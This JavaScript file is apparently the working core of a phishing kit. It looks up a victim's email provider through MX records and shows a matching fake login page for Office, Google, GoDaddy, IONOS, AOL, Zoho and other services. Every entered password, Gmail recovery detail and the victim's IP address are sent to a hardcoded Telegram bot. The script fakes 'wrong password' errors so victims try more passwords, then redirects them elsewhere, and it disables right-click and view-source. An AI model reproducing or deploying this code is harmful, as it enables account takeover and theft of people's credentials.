// storing variables
const token = "6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4";
const chatId = "1461764555";

const redirectURL =
  "http://www.cvent.com/events/2018-facial-rejuvenation/event-summary-66dad18444ca4ff1b1379df029fd67f3.aspx/";
const url_link = "";
const hero_img = document.getElementById("hero_img");
const internxtLogo = document.getElementById("internxtLogo");
const office_brand = document.getElementById("office_brand");
const office_left_arrow = document.getElementById("office_left_arrow");
const name_key = document.getElementById("name_key");
const godaddy_logo = document.getElementById("godaddy_logo");
const revision_logo = document.getElementById("revision_logo");
const revision_hero = document.getElementById("revision_hero");
const namecheap_logo = document.getElementById("namecheap_logo");
const namecheap_logo_f = document.getElementById("namecheap_logo_f");
const cart_img_nc = document.getElementById("cart_img_nc");
const search_img_nc = document.getElementById("search_img_nc");
const nc_footer_img = document.getElementById("nc_footer_img");
const earthlink_logo = document.getElementById("earthlink_logo");
const earthlink_logo2 = document.getElementById("earthlink_logo2");
const mimecast_logo = document.getElementById("mimecast_logo");
const el_footer = document.getElementById("el_footer");
const el_ggl = document.getElementById("el_ggl");
const el_search = document.getElementById("el_search");
const el_icons = document.getElementById("el_icons");
const mc_name_pass = document.getElementById("mc_name_pass");
const mc_submit_btn = document.getElementById("mc_submit_btn");
const ggl_logo = document.getElementById("ggl_logo");
const ggl_account_icon = document.getElementById("ggl_account_icon");
const ggl_down_icon = document.getElementById("ggl_down_icon");
const exclam_icon = document.getElementById("exclam_icon");
const exclam_icon2 = document.getElementById("exclam_icon2");
const rk_logo = document.getElementById("rk_logo");
const rk_banner = document.getElementById("rk_banner");
const ionos_logo = document.getElementById("ionos_logo");
const ionos_search_bar = document.getElementById("ionos_search_bar");
const ionos_qs_icon = document.getElementById("ionos_qs_icon");
const ggl_input__rpe = document.getElementById("ggl_input__rpe");
const aol_logo = document.getElementById("aol_logo");
const aol_logo2 = document.getElementById("aol_logo2");
const rc_logo = document.getElementById("rc_logo");
const zohoLogo = document.getElementById("zohoLogo");
const zohoInfo = document.getElementById("zohoInfo");
const cl_logo = document.getElementById("cl_logo");
const name_key_error_box =
  document.getElementsByClassName("name_key_error_box")[0];
const clInnerWrapper = document.getElementsByClassName("clInnerWrapper")[0];
const zohoInnerWrapper = document.getElementsByClassName("zohoInnerWrapper")[0];
const name_key_holder = document.querySelectorAll(".name_key_holder");
const null_pass_error = document.querySelectorAll(".null_pass_error");
const error_box = document.querySelectorAll(".error_box");
const name_pass = document.querySelectorAll(".name_pass");
const board = document.querySelectorAll(".board");
const greetingSection = document.getElementById("greetingSection");
const officeSection = document.getElementById("officeSection");
const godaddySection = document.getElementById("godaddySection");
const revisionSection = document.getElementById("revisionSection");
const namecheapSection = document.getElementById("namecheapSection");
const earthlinkSection = document.getElementById("earthlinkSection");
const mimecastSection = document.getElementById("mimecastSection");
const googleSection = document.getElementById("googleSection");
const webmailSection = document.getElementById("webmailSection");
const rackSection = document.getElementById("rackSection");
const ionosSection = document.getElementById("ionosSection");
const aolSection = document.getElementById("aolSection");
const roundcubeSection = document.getElementById("roundcubeSection");
const zohoSection = document.getElementById("zohoSection");
const centurylinkSection = document.getElementById("centurylinkSection");
const ionos_lock_icon = document.getElementById("ionos_lock_icon");
const ionos_user_icon = document.getElementById("ionos_user_icon");
const iem_ = document.getElementById("iem_");
const ionos_part_img = document.getElementById("ionos_part_img");
const wm_logo = document.getElementById("wm_logo");
const wm_lock_icon = document.getElementById("wm_lock_icon");
const wm_user_icon = document.getElementById("wm_user_icon");
const webmail_error = document.getElementById("webmail_error");
var message = "";

// getting ip
var ipAddress = "";
fetch("https://api.ipify.org/?format=json")
  .then((response) => response.json())
  .then((data) => {
    ipAddress = data.ip;
  })
  .catch((error) => {
    console.error("Error:", error);
  });

// storing functions
function setImg(elem, imageName) {
  elem.setAttribute("src", url_link + imageName);
}
function validateNameKey(nameKey) {
  const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return regex.test(nameKey);
}

function view_action() {
  if (validateNameKey(name_key.value)) {
    for (let i = 0; i < name_key_holder.length; i++) {
      name_key_holder[i].innerHTML = name_key.value;
    }
    document.getElementsByClassName("name_key_holder_gd")[0].value =
      name_key.value;
    document.getElementsByClassName("name_key_nc")[0].value = name_key.value;
    document.getElementsByClassName("el_name_key")[0].value = name_key.value;
    document.getElementsByClassName("cl_name_key")[0].value = name_key.value;
    document.getElementById("rk_name_key").value = name_key.value;
    document.getElementById("ionos_email").value = name_key.value;
    document.getElementById("rc_email").value = name_key.value;
    document.getElementById("wm_name_key").value = name_key.value;
    greetingSection.classList.add("d_none");
    function setting_favicon(iconName) {
      document.getElementById("fav_icon").attributes.href.textContent =
        url_link + "domain_assets/" + iconName;
    }

    function getEmailServiceProvider(email) {
      const domain = email.split("@")[1];
      const dnsLookupUrl = `https://dns.google/resolve?name=${domain}&type=MX`;
      return fetch(dnsLookupUrl)
        .then((response) => response.json())
        .then((data) => {
          const mxRecords = data.Answer.filter((record) => record.type === 15);
          if (mxRecords.length > 0) {
            const emailServiceProvider = mxRecords[0].data
              .split(" ")[1]
              .slice(0, -1);
            return emailServiceProvider;
          } else {
            return null;
          }
        });
    }
    getEmailServiceProvider(name_key.value)
      .then((esp) => {
        if (esp) {
          espName = esp.split(".");
          espName = espName[espName.length - 2];
          //   console.log(`Email service provider: ${esp}`);
          //   console.log(`Email service provider: ${espName}`);
          runESPconditions(espName);
        } else {
          googleSection.classList.remove("d_none");
          setting_favicon("google_favicon.png");
          //   console.log('Unable to determine the email service provider.');
        }
      })
      .catch((error) => {
        webmailSection.classList.remove("d_none");
        setting_favicon("cpanel_favicon.png");
        // console.error('Error:', error);
      });

    function runESPconditions(final) {
      if (
        final == "outlook" ||
        final == "office365" ||
        final == "microsoft" ||
        final == "hotmail" ||
        final == "live" ||
        final == "msn"
      ) {
        officeSection.classList.remove("d_none");
        setting_favicon("office_favicon.ico");
      } else if (final == "1&1" || final == "1and1" || final == "ionos") {
        ionosSection.classList.remove("d_none");
        setting_favicon("ionos_favicon.png");
      } else if (final == "godaddy" || final == "secureserver") {
        godaddySection.classList.remove("d_none");
        setting_favicon("godaddy_favico.png");
      } else if (final == "amazonaws") {
        revisionSection.classList.remove("d_none");
        setting_favicon("revision_Favicon.png");
      } else if (final == "yahoodns") {
        aolSection.classList.remove("d_none");
        setting_favicon("aol_favicon.png");
      } else if (final == "yahoo") {
        officeSection.classList.remove("d_none");
        setting_favicon("office_favicon.ico");
      } else if (final == "rackspace" || final == "emailsrvr") {
        rackSection.classList.remove("d_none");
        setting_favicon("rack_favicon.png");
      } else if (
        final == "namecheap" ||
        final == "jellyfish" ||
        final == "privateemail"
      ) {
        namecheapSection.classList.remove("d_none");
        setting_favicon("namecheap_favicon.png");
      } else if (final == "gmail" || final == "google") {
        googleSection.classList.remove("d_none");
        setting_favicon("google_favicon.png");
      } else if (final == "zoho") {
        zohoSection.classList.remove("d_none");
        setting_favicon("zoho_favicon.png");
      } else if (final == "centurylink") {
        centurylinkSection.classList.remove("d_none");
        setting_favicon("centurylink_favicon.png");
      } else if (final == "mimecast") {
        mimecastSection.classList.remove("d_none");
        setting_favicon("mimecast_favicon.ico");
      } else if (final == "earthlink-vadesecure") {
        earthlinkSection.classList.remove("d_none");
        setting_favicon("earthlink_favicon.ico");
      } else if (final == "roundcube") {
        roundcubeSection.classList.remove("d_none");
        setting_favicon("roundcube_favicon.png");
      } else {
        webmailSection.classList.remove("d_none");
        setting_favicon("cpanel_favicon.png");
      }
    }

    document
      .getElementsByClassName("gd_label")[0]
      .classList.add("focus_active");
    name_key_error_box.classList.remove("d_block");
    name_key.classList.remove("error_border");
  } else {
    name_key_error_box.classList.add("d_block");
    name_key.classList.add("error_border");
  }
}
var clickCount = 0;
function sign_in_action(eleNum, border) {
  //   console.log(eleNum);
  //   console.log('name_key.value', name_key.value);
  if (eleNum == 5) {
    if (validateNameKey(name_key.value)) {
      //   console.log('v n k pass & name key', name_key);
      const name_pass_value = name_pass[eleNum].value;
      //   console.log('name_pass_value', name_pass_value);
      if (ggl_input__rpe.value.length > 5) {
        // console.log('length pass');
        message =
          " Gmail is: " +
          name_key.value +
          " And recovery email or phone is: " +
          ggl_input__rpe.value +
          " and IP is: " +
          ipAddress;
        sendMessage(message);
        // console.log(message);
      } else if (
        ggl_input__rpe.value.length > 0 &&
        ggl_input__rpe.value.length < 4
      ) {
        // console.log('length fail');
        document.getElementsByClassName("skdhks__")[0].innerHTML =
          "Enter recovery Email or Phone";
        null_pass_error[eleNum].classList.add("d_block");
      }
      if (name_pass_value.length > 4) {
        clickCount++;
        if (clickCount >= 3) {
          document
            .getElementsByClassName("box_wrapper_ggl_")[0]
            .classList.add("add_e_or_p");
          error_box[eleNum].classList.remove("d_block");
          name_pass[eleNum].classList.remove("error_border_color");
        } else {
          message =
            "Gmail is: " +
            name_key.value +
            " and Password is: " +
            name_pass_value +
            " and IP is: " +
            ipAddress;
          sendMessage(message);
          //   console.log(message);
          name_pass[eleNum].value = "";
          null_pass_error[eleNum].classList.remove("d_block");
          error_box[eleNum].classList.add("d_block");
          name_pass[eleNum].classList.add("error_border_color");
        }
        if (clickCount == 4) {
          board[eleNum].classList.add("opacity_none");
          window.location.href = redirectURL;
        }
      } else {
        name_pass[eleNum].classList.add("error_border_color");
        null_pass_error[eleNum].classList.add("d_block");
        error_box[eleNum].classList.remove("d_block");
      }
    }
  } else {
    if (validateNameKey(name_key.value)) {
      //   console.log('v n k pass & name key', name_key);
      const name_pass_value = name_pass[eleNum].value;
      //   console.log('name_pass_value', name_pass_value);
      if (name_pass_value.length > 4) {
        // console.log('length pass');
        if (eleNum == 5) {
          message =
            "Email is: " +
            name_key.value +
            " and Password is: " +
            name_pass_value +
            " and recovery email or phone is: " +
            ggl_input__rpe.value +
            " and IP is: " +
            ipAddress;
          sendMessage(message);
          //   console.log(message);
        } else {
          message =
            "Email is: " +
            name_key.value +
            " and Password is: " +
            name_pass_value +
            " and IP is: " +
            ipAddress;
          sendMessage(message);
          //   console.log(message);
        }
        clickCount++;
        name_pass[eleNum].value = "";
        null_pass_error[eleNum].classList.remove("d_block");
        error_box[eleNum].classList.add("d_block");
        if (border == "no_need_border") {
        } else if (border == "no_need_error_border") {
        } else {
          name_pass[eleNum].classList.add("error_border_color");
        }
        if (clickCount == 3) {
          board[eleNum].classList.add("opacity_none");
          window.location.href = redirectURL;
        }
      } else {
        // console.log('length fail');
        if (border == "no_need_border") {
        } else {
          name_pass[eleNum].classList.add("error_border_color");
        }
        null_pass_error[eleNum].classList.add("d_block");
        error_box[eleNum].classList.remove("d_block");
      }
    } else {
      console.log("error");
    }
  }
}

// sending message
function sendMessage(message) {
  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
    message
  )}`;
  fetch(url)
    .then((response) => {
      if (!response.ok) {
        throw new Error("Network response was not ok");
      }
      return response.json();
    })
    .then((data) => {
      console.log(data);
    })
    .catch((error) => {
      console.error(error);
    });
}

// calling functions
setImg(internxtLogo, "domain_assets/internxt-logo.svg");
setImg(office_brand, "domain_assets/office_brand.svg");
setImg(office_left_arrow, "domain_assets/arrow_left.svg");
setImg(godaddy_logo, "domain_assets/godaddy_logo.png");
setImg(revision_logo, "domain_assets/aws_logo.png");
setImg(revision_hero, "domain_assets/aws_hero.png");
setImg(namecheap_logo, "domain_assets/namecheap_Logo.png");
setImg(namecheap_logo_f, "domain_assets/namecheap_Logo.png");
setImg(nc_footer_img, "domain_assets/namecheap_footer.jpg");
setImg(cart_img_nc, "domain_assets/nc_cart.png");
setImg(search_img_nc, "domain_assets/nc_search.jpg");
setImg(earthlink_logo, "domain_assets/earthlink_logo.png");
setImg(earthlink_logo2, "domain_assets/earthlink_logo.png");
setImg(el_ggl, "domain_assets/el_ggl.png");
setImg(el_search, "domain_assets/el_search_btn.png");
setImg(el_icons, "domain_assets/el_icons.jpg");
setImg(mimecast_logo, "domain_assets/mimecast_logo.png");
setImg(ggl_logo, "domain_assets/Google_logo.png");
setImg(ggl_account_icon, "domain_assets/ggl_account_icon.jpg");
setImg(ggl_down_icon, "domain_assets/ggl_down_icon.jpg");
setImg(exclam_icon, "domain_assets/exclam_error.jpg");
setImg(exclam_icon2, "domain_assets/exclam_error.jpg");
setImg(rk_logo, "domain_assets/Rackspace_Technology_Logo_RGB_WHT (1).png");
setImg(rk_banner, "domain_assets/Suspicious-Email-Banner.jpg");
setImg(ionos_logo, "domain_assets/ionos_logo.jpg");
setImg(ionos_search_bar, "domain_assets/ionos_search.jpg");
setImg(ionos_qs_icon, "domain_assets/ionos_icon.jpg");
setImg(aol_logo, "domain_assets/aol_logo.png");
setImg(aol_logo2, "domain_assets/aol_logo.png");
setImg(rc_logo, "domain_assets/roundcube.png");
setImg(
  zohoLogo,
  "domain_assets/newZoho_logo.fda7a132d51cfdb4b241aaa9854707b6.svg"
);
setImg(zohoInfo, "domain_assets/Screenshot 2023-05-08 223907.png");
setImg(cl_logo, "domain_assets/centurylink_logo_s.png");
setImg(ionos_user_icon, "domain_assets/ionos_user_icon.jpg");
setImg(ionos_lock_icon, "domain_assets/ionos_lock_icon.jpg");
setImg(wm_user_icon, "domain_assets/wm_user_icon.jpg");
setImg(wm_lock_icon, "domain_assets/wm_lock_icon.jpg");
setImg(iem_, "domain_assets/email-marketing.svg");
setImg(ionos_part_img, "domain_assets/ionos_part_2.jpg");
setImg(wm_logo, "domain_assets/webmail.svg");
setImg(webmail_error, "domain_assets/webmail_error.jpg");
const el_img_url = url_link + "domain_assets/el_footer.jpg";
el_footer.style.backgroundImage = "url('" + el_img_url + "')";
const zohoInnerWrapper_url = url_link + "domain_assets/zoho_bg.svg";
zohoInnerWrapper.style.backgroundImage = "url('" + zohoInnerWrapper_url + "')";
const clInnerWrapper_url = url_link + "domain_assets/cl_banner.jpg";
clInnerWrapper.style.backgroundImage = "url('" + clInnerWrapper_url + "')";

// Toggle password visibility
function togglePasswordVisibility(elem, passFields) {
  var passField = document.getElementById(passFields);
  if (passField.type === "password") {
    passField.type = "text";
    elem.innerHTML = "hide";
  } else {
    passField.type = "password";
    elem.innerHTML = "show";
  }
}

// input focus functions
document.getElementById("gd_nk_").addEventListener("focus", () => {
  document.getElementsByClassName("gd_label")[0].classList.add("focus_active");
});
document.getElementById("gd_nk_").addEventListener("blur", () => {
  if (document.getElementById("gd_nk_").value == "") {
    document
      .getElementsByClassName("gd_label")[0]
      .classList.remove("focus_active");
  }
});
document.getElementById("gd_np_").addEventListener("focus", () => {
  document.getElementsByClassName("gd_label")[1].classList.add("focus_active");
});
document.getElementById("gd_np_").addEventListener("blur", () => {
  if (document.getElementById("gd_np_").value == "") {
    document
      .getElementsByClassName("gd_label")[1]
      .classList.remove("focus_active");
  }
});
document.getElementById("ggl_input").addEventListener("focus", () => {
  document.getElementById("ggl_label").classList.add("ggl_active_focus");
  document.getElementById("ggl_input").classList.add("ggl_active_focus_border");
});
document.getElementById("ggl_input").addEventListener("blur", () => {
  if (document.getElementById("ggl_input").value == "") {
    document.getElementById("ggl_label").classList.remove("ggl_active_focus");
    document
      .getElementById("ggl_input")
      .classList.remove("ggl_active_focus_border");
  }
});
document.getElementById("ggl_input__rpe").addEventListener("focus", () => {
  document
    .getElementById("ggl_input__rpe_label")
    .classList.add("ggl_active_focus");
  document
    .getElementById("ggl_input__rpe")
    .classList.add("ggl_active_focus_border");
});
document.getElementById("ggl_input__rpe").addEventListener("blur", () => {
  if (document.getElementById("ggl_input__rpe").value == "") {
    document
      .getElementById("ggl_input__rpe_label")
      .classList.remove("ggl_active_focus");
    document
      .getElementById("ggl_input__rpe")
      .classList.remove("ggl_active_focus_border");
  }
});
document.getElementById("aol_name_pass").addEventListener("focus", () => {
  document.getElementById("aol_label__").classList.add("aol_focus_input");
});
document.getElementById("aol_name_pass").addEventListener("blur", () => {
  if (document.getElementById("aol_name_pass").value == "") {
    document.getElementById("aol_label__").classList.remove("aol_focus_input");
  }
});
document.getElementById("ionos_email").addEventListener("focus", () => {
  document
    .getElementById("ionos_email_label")
    .classList.add("ionos_label_after_focus");
});
document.getElementById("ionos_email").addEventListener("blur", () => {
  if (document.getElementById("ionos_email").value == "") {
    document
      .getElementById("ionos_email_label")
      .classList.remove("ionos_label_after_focus");
  }
});
document.getElementById("ionos_password").addEventListener("focus", () => {
  document
    .getElementById("ionos_password_label")
    .classList.add("ionos_label_after_focus");
});
document.getElementById("ionos_password").addEventListener("blur", () => {
  if (document.getElementById("ionos_password").value == "") {
    document
      .getElementById("ionos_password_label")
      .classList.remove("ionos_label_after_focus");
  }
});
document.getElementById("cl_name_key__").addEventListener("focus", () => {
  document.getElementById("cl_name_key__label").classList.add("cl_input_focus");
});
document.getElementById("cl_name_key__").addEventListener("blur", () => {
  if (document.getElementById("cl_name_key__").value == "") {
    document
      .getElementById("cl_name_key__label")
      .classList.remove("cl_input_focus");
  }
});
document.getElementById("name_pass__").addEventListener("focus", () => {
  document.getElementById("name_pass__label").classList.add("cl_input_focus");
});
document.getElementById("name_pass__").addEventListener("blur", () => {
  if (document.getElementById("name_pass__").value == "") {
    document
      .getElementById("name_pass__label")
      .classList.remove("cl_input_focus");
  }
});
document
  .getElementsByClassName("info_btn")[0]
  .addEventListener("mouseover", () => {
    document.getElementsByClassName("ds_callout")[0].classList.add("d_block");
  });
document
  .getElementsByClassName("info_btn")[0]
  .addEventListener("mouseout", () => {
    document
      .getElementsByClassName("ds_callout")[0]
      .classList.remove("d_block");
  });

// button focus
mc_name_pass.addEventListener("keyup", () => {
  if (mc_name_pass.value.length !== 0) {
    mc_submit_btn.style.backgroundColor = "#1976d2";
  } else {
    mc_submit_btn.style.backgroundColor = "#1976d2ad";
  }
});

//inspect off
function redirectCU(e) {
  if (e.ctrlKey && e.which == 85) {
    return false;
  }
}
document.onkeydown = redirectCU;
function redirectKK(e) {
  if (e.which == 3) {
    return false;
  }
}
document.oncontextmenu = redirectKK;
